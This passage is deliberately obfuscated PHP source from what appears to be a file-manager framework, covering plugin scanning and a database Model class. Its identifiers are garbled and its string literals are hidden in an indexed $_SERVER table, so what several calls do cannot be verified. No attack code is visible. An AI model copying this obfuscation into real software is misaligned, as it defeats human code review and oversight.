$this->getConfigDefault($ÉòØ®«ë); } foreach ($ÍÔÙ“÷… as $ŒŠõû¼ => $Ì£ã½Ã´) { $¤õÊúŒÅ[$ŒŠõû¼] = is_string($Ì£ã½Ã´) ? trim($Ì£ã½Ã´) : $Ì£ã½Ã´; } $this->update($°©¬³’Æ[$¸šÑ’…¤[399]], array($¸šÑ’…¤[6] => $¤õÊúŒÅ)); } public function viewList() { $‡…•¢ÒÓ =& $_SERVER[­á Ş³Ö]; $şä®øµ = $this->loadList(); $this->pluginScan($şä®øµ); $şä®øµ = $this->loadPluginList(); $”á£ØË = array(); foreach ($şä®øµ as $ä¶ËíîØ => $Ï™‡¦ØÕ) { unset($Ï™‡¦ØÕ[$‡…•¢ÒÓ[1973]], $Ï™‡¦ØÕ[$‡…•¢ÒÓ[6]]); $›Ş¥ş‚ƒ = PLUGIN_DIR . $Ï™‡¦ØÕ[$‡…•¢ÒÓ[32]] . $‡…•¢ÒÓ[1975]; if (!is_file($›Ş¥ş‚ƒ)) { continue; } $ˆ¶¼Î¢ = Hook::apply($Ï™‡¦ØÕ[$‡…•¢ÒÓ[32]] . $‡…•¢ÒÓ[1983]); if (is_array($ˆ¶¼Î¢)) { $”á£ØË[$ä¶ËíîØ] = array_merge($Ï™‡¦ØÕ, $ˆ¶¼Î¢); } } return $”á£ØË; } private function loadPluginList() { $ÆØÒÀó =& $_SERVER[­á Ş³Ö]; $ø‡¢û×× = $this->loadList(); if (strtolower(MOD) == $ÆØÒÀó[1984]) { return $ø‡¢û××; } $¥È€¢Ş¨ = Hook::trigger($ÆØÒÀó[1985], $ø‡¢û××); if ($ø‡¢û×× && !$¥È€¢Ş¨) { die; } return $¥È€¢Ş¨ ? $¥È€¢Ş¨ : $ø‡¢û××; } private function pluginScan($©¿Ş”«ç) { $ğ—ì™È© =& $_SERVER[­á Ş³Ö]; recursion_dir(PLUGIN_DIR, $¥Éàï³©, $Ø„Íåë–, 0); foreach ($¥Éàï³© as $®µß Á) { $¦«ù‘¼º = get_path_this($®µß Á); if (isset($©¿Ş”«ç[$¦«ù‘¼º]) || !file_exists($®µß Á . $ğ—ì™È©[1986]) || !file_exists($®µß Á . $ğ—ì™È©[1975])) { continue; } Hook::apply($¦«ù‘¼º . $ğ—ì™È©[1980]); } } } goto F‰±àùˆÓã; AÈÖÇ–˜Ÿ¸: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\x62\x6c\145", "\157\x72\144\145\x72", "\x61\x6c\x69\141\x73", "\x68\141\x76\x69\x6e\147", "\x67\x72\x6f\165\x70", "\154\x6f\143\x6b", "\x64\x69\163\164\151\156\x63\x74", "\141\x75\x74\x6f", "\146\151\154\164\x65\x72", "\x76\x61\x6c\x69\144\x61\164\145", "\x72\145\163\165\x6c\164", "\x62\151\156\144", "\164\157\153\145\156"); public function __construct($ï¤à = '', $˜Ü ‘Ëâ = '', $¿×¸¸ø¿ = '') { $ÈÔ†­¥€ =& $_SERVER[­á Ş³Ö]; $this->_initialize(); if (!empty($ï¤à)) { if (strpos($ï¤à, $ÈÔ†­¥€[10])) { list($this->dbName, $this->name) = explode($ÈÔ†­¥€[10], $ï¤à); } else { $this->name = $ï¤à; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($˜Ü ‘Ëâ)) { $this->tablePrefix = $ÈÔ†­¥€[12]; } elseif ($ÈÔ†­¥€[12] != $˜Ü ‘Ëâ) { $this->tablePrefix = $˜Ü ‘Ëâ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ÈÔ†­¥€[244]); } $this->db(0, empty($this->connection) ? $¿×¸¸ø¿ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $è÷ÆÅåÒ =& $_SERVER[­á Ş³Ö]; if (empty($this->fields)) { if (think_config($è÷ÆÅåÒ[245])) { $±ˆÜä‡ = $this->dbName ? $this->dbName : think_config($è÷ÆÅåÒ[246]); $¾¿²²è = think_var_cache($è÷ÆÅåÒ[247] . strtolower(get_path_this($±ˆÜä‡) . $è÷ÆÅåÒ[10] . $this->name)); if ($¾¿²²è) { $¯÷È›š· = think_config($è÷ÆÅåÒ[248]); if (empty($¯÷È›š·) || $¾¿²²è[$è÷ÆÅåÒ[249]] == $¯÷È›š·) { $this->fields = $¾¿²²è; return; } } } $this->flush(); } } public function flush() { $ü²Ûœš‚ =& $_SERVER[­á Ş³Ö]; $this->db->setModel($this->name); $½Öê°§• = $this->db->getFields($this->getTableName()); if (!$½Öê°§•) { return !1; } $this->fields = array_keys($½Öê°§•); $this->fields[$ü²Ûœš‚[250]] = !1; foreach ($½Öê°§• as $óÈêö› => $›€©Ó¡) { $¯ÃòŞ¿[$óÈêö›] = $›€©Ó¡[$ü²Ûœš‚[33]]; if ($›€©Ó¡[$ü²Ûœš‚[39]]) { $this->fields[$ü²Ûœš‚[251]] = $óÈêö›; if ($›€©Ó¡[$ü²Ûœš‚[42]]) { $this->fields[$ü²Ûœš‚[250]] = !0; } } } $this->fields[$ü²Ûœš‚[252]] = $¯ÃòŞ¿; if (think_config($ü²Ûœš‚[248])) { $this->fields[$ü²Ûœš‚[249]] = think_config($ü²Ûœš‚[248]); } if (think_config($ü²Ûœš‚[245])) { $‰™áĞ‹ = $this->dbName ? $this->dbName : think_config($ü²Ûœš‚[246]); think_var_cache($ü²Ûœš‚[247] . strtolower(get_path_this($‰™áĞ‹) . $ü²Ûœš‚[10] . $this->name), $this->fields); } } public function switchModel($œ¿çŞÍö, $šõëƒÁç = array()) { $æ‹›ŞıÒ =& $_SERVER[­á Ş³Ö]; $üô—£û = ucwords(strtolower($œ¿çŞÍö)) . $æ‹›ŞıÒ[253]; if (!class_exists($üô—£û)) { think_exception($üô—£û . think_lang($æ‹›ŞıÒ[254])); } $this->_extModel = new $üô—£û($this->name); if (!empty($šõëƒÁç)) { foreach ($šõëƒÁç as $ÜÅ­ªÁÖ) { $this->_extModel->setProperty($ÜÅ­ªÁÖ, $this->{$ÜÅ­ªÁÖ}); } } return $this->_extModel; } public function __set($‘ñàòÇÏ, $‰âÂ¢Ş) { $this->data[$‘ñàòÇÏ] = $‰âÂ¢Ş; } public function __get($ª–ˆ¯ ) { return isset($this->data[$ª–ˆ¯ ]) ? $this->data[$ª–ˆ¯ ] : null; } public function __isset($ú÷ºªŞÂ) { return isset($this->data[$ú÷ºªŞÂ]); } public function __unset($ÙÂÇê½) { unset($this->data[$ÙÂÇê½]); } public function __call($íÏğªöá, $ÉçÎÇµ™) { $úÃÈçşæ =& $_SERVER[­á Ş³Ö]; if (in_array(strtolower($íÏğªöá), $this->methods, !0)) { $this->options[strtolower($íÏğªöá)] = $ÉçÎÇµ™[0]; return $this; } elseif (in_array(strtolower($íÏğªöá), array($úÃÈçşæ[255], $úÃÈçşæ[256], $úÃÈçşæ[257], $úÃÈçşæ[258], $úÃÈçşæ[259]), !0)) { $€¬ò±í = isset($ÉçÎÇµ™[0]) ? $ÉçÎÇµ™[0] : $úÃÈçşæ[189]; $€¬ò±í = $this->db->parseKey($€¬ò±í); return $this->getField(strtoupper($íÏğªöá) . $úÃÈçşæ[260] . $€¬ò±í . $úÃÈçşæ[261] . $íÏğªöá, $úÃÈçşæ[255]); } elseif (strtolower(substr($íÏğªöá, 0, 5)) == $úÃÈçşæ[262]) { $€¬ò±í = think_parse_name(substr($íÏğªöá, 5)); $‡ó’àéç[$€¬ò±í] = $ÉçÎÇµ™[0]; return $this->where($‡ó’àéç)->find(); } elseif (strtolower(substr($íÏğªöá, 0, 10)) == $úÃÈçşæ[263]) { $ôù³´ßì = think_parse_name(substr($íÏğªöá, 10)); $‡ó’àéç[$ôù³´ßì] = $ÉçÎÇµ™[0]; return $this->where($‡ó’àéç)->getField($ÉçÎÇµ™[1]); } elseif (isset($this->_scope[$íÏğªöá])) { return $this->scope($íÏğªöá, $ÉçÎÇµ™[0]); } elseif (method_exists($this, $íÏğªöá)) { array_unshift($ÉçÎÇµ™, $íÏğªöá); return call_user_func_array(array($this, $úÃÈçşæ[264]), $ÉçÎÇµ™); } else { return call_user_func_array(array(parent, $íÏğªöá), $ÉçÎÇµ™); } } protected function call() { $Õü³ÈÇØ =& $_SERVER[­á Ş³Ö]; $¥¸î¡Ñ· = func_get_args(); $¡ç€üÊé = array_shift($¥¸î¡Ñ·); $ºã¥Üê = $¡ç€üÊé; if (is_array($¡ç€üÊé)) { $ºã¥Üê = $¡ç€üÊé[1]; $¡ç€üÊé = $¡ç€üÊé[0]; } $ÏşÈåÇ = count($¥¸î¡Ñ·) - 1; if (isset($¥¸î¡Ñ·[$ÏşÈåÇ]) && $¥¸î¡Ñ·[$ÏşÈåÇ] === $¡ç€üÊé) { think_exception(__CLASS__ . $Õü³ÈÇØ[4] . $¡ç€üÊé . think_lang($Õü³ÈÇØ[265])); return; } $¥¸î¡Ñ·[] = $¡ç€üÊé; if (method_exists($this, $Õü³ÈÇØ[266])) { $ÌÒ“‡çá = call_user_func_array(array($this, $Õü³ÈÇØ[267]), array($ºã¥Üê, $¥¸î¡Ñ·)); if (!is_null($ÌÒ“‡çá) && $ÌÒ“‡çá !== !1) { return $ÌÒ“‡çá; } } $æÍÒ¶ = call_user_func_array(array($this, $¡ç€üÊé), $¥¸î¡Ñ·); if (method_exists($this, $Õü³ÈÇØ[268])) { $ÌÒ“‡çá = call_user_func_array(array($this, $Õü³ÈÇØ[269]), array($ºã¥Üê, $¥¸î¡Ñ·, $æÍÒ¶)); if ($ÌÒ“‡çá) { return $ÌÒ“‡çá; } } return $æÍÒ¶; } protected function _initialize() { } protected function _facade($…›ˆº–¡) { $ú»õ×ÊÑ =& $_SERVER[­á Ş³Ö]; if (!empty($this->fields)) { foreach ($…›ˆº–¡ as $ÕÃ¼ÑîÄ => $Ã›Ñ€Æµ) { if (is_array($this->fields) && !in_array($ÕÃ¼ÑîÄ, $this->fields, !0)) { unset($…›ˆº–¡[$ÕÃ¼ÑîÄ]); } elseif (is_scalar($Ã›Ñ€Æµ)) { $this->_parseType($…›ˆº–¡, $ÕÃ¼ÑîÄ); } } } if (!empty($this->options[$ú»õ×ÊÑ[270]])) { $…›ˆº–¡ = array_map($this->options[$ú»õ×ÊÑ[270]], $…›ˆº–¡); unset($this->options[$ú»õ×ÊÑ[270]]); } $this->_beforeWrite($…›ˆº–¡); return $…›ˆº–¡; } protected function _beforeWrite(&$ŠÅï–ï‚) { } public function add($°Áî¨ÑÒ = '', $ú­‰ÄÂÏ = array(), $Ä’í¡ë« = false) { if (empty($°Áî¨ÑÒ)) { if (!empty($this->data)) { $°Áî¨ÑÒ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[­á Ş³Ö][271]); return !1; } } $ú­‰ÄÂÏ = $this->_parseOptions($ú­‰ÄÂÏ); $°Áî¨ÑÒ = $this->_facade($°Áî¨ÑÒ); if (!1 === $this->_beforeInsert($°Áî¨ÑÒ, $ú­‰ÄÂÏ)) { return !1; } $×Ï”Ò³Ş = $this->db->insert($°Áî¨ÑÒ, $ú­‰ÄÂÏ, $Ä’í¡ë«); if (!1 !== $×Ï”Ò³Ş) { $·È«¤åÎ = $this->getLastInsID(); if ($·È«¤åÎ) { $°Áî¨ÑÒ[$this->getPk()] = $·È«¤åÎ; $this->_after_insert($°Áî¨ÑÒ, $ú­‰ÄÂÏ); return $·È«¤åÎ; } $this->_after_insert($°Áî¨ÑÒ, $ú­‰ÄÂÏ); } return $×Ï”Ò³Ş; } protected function _beforeInsert(&$ÖÕêÇ§„, $ÂÇ‚Éå¥) { } protected function _after_insert($Á¥¸©Š², $»Ï›Ÿ) { } public function addAll($®Ãø›‡ı, $šÂ½Ãè÷ = array(), $€Àºâ = false) { $ñòÕ¶¤Ì =& $_SERVER[­á Ş³Ö]; if (empty($®Ãø›‡ı)) { $this->error = think_lang($ñòÕ¶¤Ì[271]); return !1; } $šÂ½Ãè÷ = $this->_parseOptions($šÂ½Ãè÷); foreach ($®Ãø›‡ı as $ÎÕ¡’¥ì => $ÊáâÅÈ§) { $®Ãø›‡ı[$ÎÕ¡’¥ì] = $this->_facade($ÊáâÅÈ§); } if (method_exists($this->db, $ñòÕ¶¤Ì[272])) { $ìğ·ªˆ“ = $this->db->insertAll($®Ãø›‡ı, $šÂ½Ãè÷, $€Àºâ); } else { $this->startTrans(); foreach ($®Ãø›‡ı as $ÎÕ¡’¥ì => $ÊáâÅÈ§) { $ìğ·ªˆ“ = $this->db->insert($ÊáâÅÈ§, $šÂ½Ãè÷, $€Àºâ); } $this->commit(); } if (!1 !== $ìğ·ªˆ“) { $ì¯½“ = $this->getLastInsID(); if ($ì¯½“) { return $ì¯½“; } } return $ìğ·ªˆ“; } public function selectAdd($Ÿ«×ôê = '', $œ–ÎÃ‘Ğ = '', $Ææ«ÂÌ = array()) { $àŒÂ¹×ƒ =& $_SERVER[­á Ş³Ö]; $Ææ«ÂÌ = $this->_parseOptions($Ææ«ÂÌ); if (!1 === ($ô«ïºï = $this->db->selectInsert($Ÿ«×ôê ? $Ÿ«×ôê : $Ææ«ÂÌ[$àŒÂ¹×ƒ[273]], $œ–ÎÃ‘Ğ ? $œ–ÎÃ‘Ğ : $this->getTableName(), $Ææ«ÂÌ))) { $this->error = think_lang($àŒÂ¹×ƒ[274]); return !1; } else { return $ô«ïºï; } } public function save($®ÍŠæØ¨ = '', $¸™†æ’‚ = array()) { $éº«ƒ½Í =& $_SERVER[­á Ş³Ö]; if (empty($®ÍŠæØ¨)) { if (!empty($this->data)) { $®ÍŠæØ¨ = $this->data; $this->data = array(); } else { $this->error = think_lang($éº«ƒ½Í[271]); return !1; } } $®ÍŠæØ¨ = $this->_facade($®ÍŠæØ¨); $¸™†æ’‚ = $this->_parseOptions($¸™†æ’‚); $ü¢Ÿ»ßÎ = $this->getPk(); if (!isset($¸™†æ’‚[$éº«ƒ½Í[275]])) { if (isset($®ÍŠæØ¨[$ü¢Ÿ»ßÎ])) { $á€ÕË‘Ø[$ü¢Ÿ»ßÎ] = $®ÍŠæØ¨[$ü¢Ÿ»ßÎ]; $¸™†æ’‚[$éº«ƒ½Í[275]] = $á€ÕË‘Ø; unset($®ÍŠæØ¨[$ü¢Ÿ»ßÎ]); } else { $this->error = think_lang($éº«ƒ½Í[274]); return !1; } } if (is_array($¸™†æ’‚[$éº«ƒ½Í[275]]) && isset($¸™†æ’‚[$éº«ƒ½Í[275]][$ü¢Ÿ»ßÎ])) { $îØ€Õ… = $¸™†æ’‚[$éº«ƒ½Í[275]][$ü¢Ÿ»ßÎ]; } if (!1 === $this->_beforeUpdate($®ÍŠæØ¨, $¸™†æ’‚)) { return !1; } $ûû¼Óë = $this->db->update($®ÍŠæØ¨, $¸™†æ’‚); if (!1 !== $ûû¼Óë) { if (isset($îØ€Õ…)) { $®ÍŠæØ¨[$ü¢Ÿ»ßÎ] = $îØ€Õ…; } $this->_afterUpdate($®ÍŠæØ¨, $¸™†æ’‚); } return $ûû¼Óë; } protected function _beforeUpdate(&$µ³é·‰œ, $Ã¬æä™) { } protected function _afterUpdate($ŠİµÊ¹ä, $ÕŠ†İØ) { } public function delete($œü”Ø³¨ = array()) { $¾˜Äı¡½ =& $_SERVER[­á Ş³Ö]; if (empty($œü”Ø³¨) && empty($this->options[$¾˜Äı¡½[275]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $„ã” … = $this->getPk(); if (is_numeric($œü”Ø³¨) || is_string($œü”Ø³¨)) { if (strpos($œü”Ø³¨, $¾˜Äı¡½[50])) { $ßè“·áÑ[$„ã” …] = array($¾˜Äı¡½[276], $œü”Ø³¨); } else { $ßè“·áÑ[$„ã” …] = $œü”Ø³¨; } $this->options[$¾˜Äı¡½[275]] = $ßè“·áÑ; } $œü”Ø³¨ = $this->_parseOptions(); if (is_array($œü”Ø³¨[$¾˜Äı¡½[275]]) && isset($œü”Ø³¨[$¾˜Äı¡½[275]][$„ã” …])) { $ãÈ¡ß¬™ = $œü”Ø³¨[$¾˜Äı¡½[275]][$„ã” …]; } $¬«Î¿Ê = $this->db->delete($œü”Ø³¨); if (!1 !== $¬«Î¿Ê) { $ÛÙäÇıİ = array(); if (isset($ãÈ¡ß¬™)) { $ÛÙäÇıİ[$„ã” …] = $ãÈ¡ß¬™; } $this->_after_delete($ÛÙäÇıİ, $œü”Ø³¨); } return $¬«Î¿Ê; } protected function _after_delete($û¼°¯, $çĞÔ×ä) { } public function select($‡Ô‚ÖÜ = array()) { $ùæœ»“¹ =& $_SERVER[­á Ş³Ö]; if (is_string($‡Ô‚ÖÜ) || is_numeric($‡Ô‚ÖÜ)) { $²ŒÉø ö = $this->getPk(); if (strpos($‡Ô‚ÖÜ, $ùæœ»“¹[50])) { $¬İ¶»’[$²ŒÉø ö] = array($ùæœ»“¹[276], $‡Ô‚ÖÜ); } else { $¬İ¶»’[$²ŒÉø ö] = $‡Ô‚ÖÜ; } $this->options[$ùæœ»“¹[275]] = $¬İ¶»’; } elseif (!1 === $‡Ô‚ÖÜ) { $‡Ô‚ÖÜ = $this->_parseOptions(); return $ùæœ»“¹[277] . $this->db->buildSelectSql($‡Ô‚ÖÜ) . $ùæœ»“¹[278]; } $‡Ô‚ÖÜ = $this->_parseOptions(); $µÖùóğ™ = $this->db->select($‡Ô‚ÖÜ); if (!1 === $µÖùóğ™) { return !1; } if (empty($µÖùóğ™)) { return null; } $this->_afterSelect($µÖùóğ™, $‡Ô‚ÖÜ); return $µÖùóğ™; } protected function _afterSelect(&$ÆÔ«©Û’, $¿ğı’³‡) { } public function buildSql($Á¹‡äó = array()) { $™ÛÚ†ï =& $_SERVER[­á Ş³Ö]; $Á¹‡äó = $this->_parseOptions($Á¹‡äó); return $™ÛÚ†ï[277] . $this->db->buildSelectSql($Á¹‡äó) . $™ÛÚ†ï[278]; } public function optionsValue($Ù÷ë½øÔ = null) { if (is_null($Ù÷ë½øÔ)) { return $this->options; } elseif (is_array($Ù÷ë½øÔ)) { $this->options = array_merge($this->options, $Ù÷ë½øÔ); } } protected function _parseOptions($Ø¼é–‰… = array()) { $şáÒÁƒ± =& $_SERVER[­á Ş³Ö]; if (is_array($Ø¼é–‰…)) { $Ø¼é–‰… = array_merge($this->options, $Ø¼é–‰…); } $this->options = array(); if (!isset($Ø¼é–‰…[$şáÒÁƒ±[279]])) { $Ø¼é–‰…[$şáÒÁƒ±[279]] = $this->getTableName(); $ÃˆÄ¡Ş = $this->fields; } else { $ÃˆÄ¡Ş = $this->getDbFields(); } if (!empty($Ø¼é–‰…[$şáÒÁƒ±[280]])) { $Ø¼é–‰…[$şáÒÁƒ±[279]] .= $şáÒÁƒ±[53] . $Ø¼é–‰…[$şáÒÁƒ±[280]]; } $Ø¼é–‰…[$şáÒÁƒ±[281]] = $this->name; if (isset($Ø¼é–‰…[$şáÒÁƒ±[275]]) && is_array($Ø¼é–‰…[$şáÒÁƒ±[275]]) && !empty($ÃˆÄ¡Ş) && !isset($Ø¼é–‰…[$şáÒÁƒ±[282]]) && !isset($Ø¼é–‰…[$şáÒÁƒ±[279]])) { foreach ($Ø¼é–‰…[$şáÒÁƒ±[275]] as $·Æ§ò“œ => $›ÌÄ¸£) { $·Æ§ò“œ = trim($·Æ§ò“œ); if (in_array($·Æ§ò“œ, $ÃˆÄ¡Ş, !0)) { if (is_scalar($›ÌÄ¸£)) { $this->_parseType($Ø¼é–‰…[$şáÒÁƒ±[275]], $·Æ§ò“œ); } } elseif (!is_numeric($·Æ§ò“œ) && $şáÒÁƒ±[11] != substr($·Æ§ò“œ, 0, 1) && !1 === strpos($·Æ§ò“œ, $şáÒÁƒ±[10]) && !1 === strpos($·Æ§ò“œ, $şáÒÁƒ±[260]) && !1 === strpos($·Æ§ò“œ, $şáÒÁƒ±[283]) && !1 === strpos($·Æ§ò“œ, $şáÒÁƒ±[284])) { unset($Ø¼é–‰…[$şáÒÁƒ±[275]][$·Æ§ò“œ]); } } } $this->_options_filter($Ø¼é–‰…); return $Ø¼é–‰…; } protected function _options_filter(&$·Í¹—Ò¤) { } protected function _parseType(&$äş©Ëí², $ìÀ«»œµ) { $°÷ô°ñ… =& $_SERVER[­á Ş³Ö]; if (empty($this->options[$°÷ô°ñ…[285]][$°÷ô°ñ…[4] . $ìÀ«»œµ])) { $Ëö¿Ïˆª = strtolower($this->fields[$°÷ô°ñ…[252]][$ìÀ«»œµ]); if (!1 !== strpos($Ëö¿Ïˆª, $°÷ô°ñ…[286])) { } elseif (!1 === strpos($Ëö¿Ïˆª, $°÷ô°ñ…[287]) && !1 !== strpos($Ëö¿Ïˆª, $°÷ô°ñ…[288])) { $äş©Ëí²[$ìÀ«»œµ] = intval($äş©Ëí²[$ìÀ«»œµ]); } elseif (!1 !== strpos($Ëö¿Ïˆª, $°÷ô°ñ…[289]) || !1 !== strpos($Ëö¿Ïˆª, $°÷ô°ñ…[290])) { $äş©Ëí²[$ìÀ«»œµ] = floatval($äş©Ëí²[$ìÀ«»œµ]); } elseif (!1 !== strpos($Ëö¿Ïˆª, $°÷ô°ñ…[291])) { $äş©Ëí²[$ìÀ«»œµ] = (bool) $äş©Ëí²[$ìÀ«»œµ]; } } } public function find($•¹‚š = array()) { $ğ™‡‚ÊŸ =& $_SERVER[­á Ş³Ö]; if (is_numeric($•¹‚š) || is_string($•¹‚š)) { $ë‚Ñó¤é[$this->getPk()] = intval($•¹‚š); $this->options[$ğ™‡‚ÊŸ[275]] = $ë‚Ñó¤é; } $this->options[$ğ™‡‚ÊŸ[292]] = 1; $•¹‚š = $this->_parseOptions(); $»§õÕ¹Ò = $this->db->select($•¹‚š); if (!1 === $»§õÕ¹Ò) { return !1; } if (empty($»§õÕ¹Ò)) { return null; } $this->data = $»§õÕ¹Ò[0]; $this->_afterFind($this->data, $•¹‚š); if (!empty($this->options[$ğ™‡‚ÊŸ[293]])) { return $this->returnResult($this->data, $this->options[$ğ™‡‚ÊŸ[293]]); } return $this->data; } protected function _afterFind(&$«¡…ß×ñ, $Ûä‹—ßÀ) { } protected function returnResult($¤ñÖº‚, $ùòïŠš€ = '') { $ßùìû¥Â =& $_SERVER[­á Ş³Ö]; if ($ùòïŠš€) { if (is_callable($ùòïŠš€)) { return call_user_func($ùòïŠš€, $¤ñÖº‚); } switch (strtolower($ùòïŠš€)) { case $ßùìû¥Â[294]: return json_encode($¤ñÖº‚); case $ßùìû¥Â[295]: return xml_encode($¤ñÖº‚); } } return $¤ñÖº‚; } public function parseFieldsMap($Ö¥èÓéä, $Ñîµ ûœ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ÔÄ²¶Ø£ => $ëÎ£•æ) { if ($Ñîµ ûœ == 1) { if (isset($Ö¥èÓéä[$ëÎ£•æ])) { $Ö¥èÓéä[$ÔÄ²¶Ø£] = $Ö¥èÓéä[$ëÎ£•æ]; unset($Ö¥èÓéä[$ëÎ£•æ]); } } else { if (isset($Ö¥èÓéä[$ÔÄ²¶Ø£])) { $Ö¥èÓéä[$ëÎ£•æ] = $Ö¥èÓéä[$ÔÄ²¶Ø£]; unset($Ö¥èÓéä[$ÔÄ²¶Ø£]); } } } } return $Ö¥èÓéä; } public function setField($ğÕàå, $Õ½¡üª± = '') { if (is_array($ğÕàå)) { $ĞŸ ›€à = $ğÕàå; } else { $ĞŸ ›€à[$ğÕàå] = $Õ½¡üª±; } return $this->save($ĞŸ ›€à); } public function setAdd($ì¢· üŸ, $çØôõĞ¤ = 1) { $‹¯‡İİ =& $_SERVER[­á Ş³Ö]; $Ê±ëåıì = $ì¢· üŸ . $‹¯‡İİ[296] . $çØôõĞ¤; if ($çØôõĞ¤ < 0) { $Ê±ëåıì = $ì¢· üŸ . $çØôõĞ¤; } return $this->setField($ì¢· üŸ, array($‹¯‡İİ[297], $Ê±ëåıì)); } public function getField($¿í¿¾Å¦, $õ®É¹ = null) { $ĞÔ…ÂñÂ =& $_SERVER[­á Ş³Ö]; $®ƒ—ïÆº[$ĞÔ…ÂñÂ[273]] = $¿í¿¾Å¦; $®ƒ—ïÆº = $this->_parseOptions($®ƒ—ïÆº); $¿í¿¾Å¦ = trim($¿í¿¾Å¦); if (strpos($¿í¿¾Å¦, $ĞÔ…ÂñÂ[50])) { if (!isset($®ƒ—ïÆº[$ĞÔ…ÂñÂ[292]])) { $®ƒ—ïÆº[$ĞÔ…ÂñÂ[292]] = is_numeric($õ®É¹) ? $õ®É¹ : $ĞÔ…ÂñÂ[12]; } $·³õú¨Ú = $this->db->select($®ƒ—ïÆº); if (!empty($·³õú¨Ú)) { $ìÆŸŒ·— = explode($ĞÔ…ÂñÂ[50], $¿í¿¾Å¦); $¿í¿¾Å¦ = array_keys($·³õú¨Ú[0]); $Š¦Œ†ß• = array_shift($¿í¿¾Å¦); $ë³î † = array_shift($¿í¿¾Å¦); $ÌæĞ×ì£ = array(); $’½¤²±Ê = count($ìÆŸŒ·—); foreach ($·³õú¨Ú as $Ñ™Ú­ô) { $„ı×íœ½ = $Ñ™Ú­ô[$Š¦Œ†ß•]; if (2 == $’½¤²±Ê) { $ÌæĞ×ì£[$„ı×íœ½] = $Ñ™Ú­ô[$ë³î †]; } else { $ÌæĞ×ì£[$„ı×íœ½] = is_string($õ®É¹) ? implode($õ®É¹, $Ñ™Ú­ô) : $Ñ™Ú­ô; } } return $ÌæĞ×ì£; } } else { if (!0 !== $õ®É¹) { $®ƒ—ïÆº[$ĞÔ…ÂñÂ[292]] = is_numeric($õ®É¹) ? $õ®É¹ : 1; } if ($õ®É¹ === $ĞÔ…ÂñÂ[255]) { unset($®ƒ—ïÆº[$ĞÔ…ÂñÂ[292]]); } $Ñ™Ú­ô = $this->db->select($®ƒ—ïÆº); if (!empty($Ñ™Ú­ô)) { if ($õ®É¹ === $ĞÔ…ÂñÂ[255]) { return reset($Ñ™Ú­ô[0]); } if (!0 !== $õ®É¹ && 1 == $®ƒ—ïÆº[$ĞÔ…ÂñÂ[292]]) { return reset($Ñ™Ú­ô[0]); } foreach ($Ñ™Ú­ô as $±Æí’ÛŒ) { $çÜÚ¡›í[] = $±Æí’ÛŒ[$¿í¿¾Å¦]; } return $çÜÚ¡›í; } } return null; } public function create($É•¾ÀÎÔ = '', $ÔÁÊˆĞ† = '') { $Æ­¦÷Îˆ =& $_SERVER[­á Ş³Ö]; if (empty($É•¾ÀÎÔ)) { $É•¾ÀÎÔ = $_POST; } elseif (is_object($É•¾ÀÎÔ)) { $É•¾ÀÎÔ = get_object_vars($É•¾ÀÎÔ); } if (empty($É•¾ÀÎÔ) || !is_array($É•¾ÀÎÔ)) { $this->error = think_lang($Æ­¦÷Îˆ[271]); return !1; } $É•¾ÀÎÔ = $this->parseFieldsMap($É•¾ÀÎÔ, 0); $ÔÁÊˆĞ† = $ÔÁÊˆĞ† ? $ÔÁÊˆĞ† : (!empty($É•¾ÀÎÔ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$Æ­¦÷Îˆ[273]])) { $ÅúÇš = $this->options[$Æ­¦÷Îˆ[273]]; unset($this->options[$Æ­¦÷Îˆ[273]]); } elseif ($ÔÁÊˆĞ† == THINK_MODEL_INSERT && isset($this->insertFields)) { $ÅúÇš = $this->insertFields; } elseif ($ÔÁÊˆĞ† == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ÅúÇš = $this->updateFields; } if (isset($ÅúÇš)) { if (is_string($ÅúÇš)) { $ÅúÇš = explode($Æ­¦÷Îˆ[50], $ÅúÇš); } if (think_config($Æ­¦÷Îˆ[298])) { $ÅúÇš[] = think_config($Æ­¦÷Îˆ[299]); } foreach ($É•¾ÀÎÔ as $ÚßÛîÑ• => $ÄÏ†‡Õò) { if (!in_array($ÚßÛîÑ•, $ÅúÇš)) { unset($É•¾ÀÎÔ[$ÚßÛîÑ•]); } } } if (!$this->autoValidation($É•¾ÀÎÔ, $ÔÁÊˆĞ†)) { return !1; } if (!$this->autoCheckToken($É•¾ÀÎÔ)) { $this->error = think_lang($Æ­¦÷Îˆ[300]); return !1; } if ($this->autoCheckFields) { $ÅúÇš = $this->getDbFields(); foreach ($É•¾ÀÎÔ as $ÚßÛîÑ• => $ÄÏ†‡Õò) { if (!in_array($ÚßÛîÑ•, $ÅúÇš)) { unset($É•¾ÀÎÔ[$ÚßÛîÑ•]); } elseif (MAGIC_QUOTES_GPC && is_string($ÄÏ†‡Õò)) { $É•¾ÀÎÔ[$ÚßÛîÑ•] = stripslashes($ÄÏ†‡Õò); } } } $this->autoOperation($É•¾ÀÎÔ, $ÔÁÊˆĞ†); $this->data = $É•¾ÀÎÔ; return $É•¾ÀÎÔ; } public function autoCheckToken($¬•ÅƒïŞ) { $À™Á¨± =& $_SERVER[­á Ş³Ö]; if (isset($this->options[$À™Á¨±[301]]) && !$this->options[$À™Á¨±[301]]) { return !0; } if (think_config($À™Á¨±[298])) { $©ëÚïÎÊ = think_config($À™Á¨±[299]); if (!isset($¬•ÅƒïŞ[$©ëÚïÎÊ]) || Session::get($©ëÚïÎÊ)) { return !1; } list($ê¼Áß«Æ, $Ô×ÄšŸÛ) = explode($À™Á¨±[11], $¬•ÅƒïŞ[$©ëÚïÎÊ]); if ($Ô×ÄšŸÛ && Session::get($©ëÚïÎÊ . $À™Á¨±[10] . $ê¼Áß«Æ) === $Ô×ÄšŸÛ) { Session::remove($©ëÚïÎÊ . 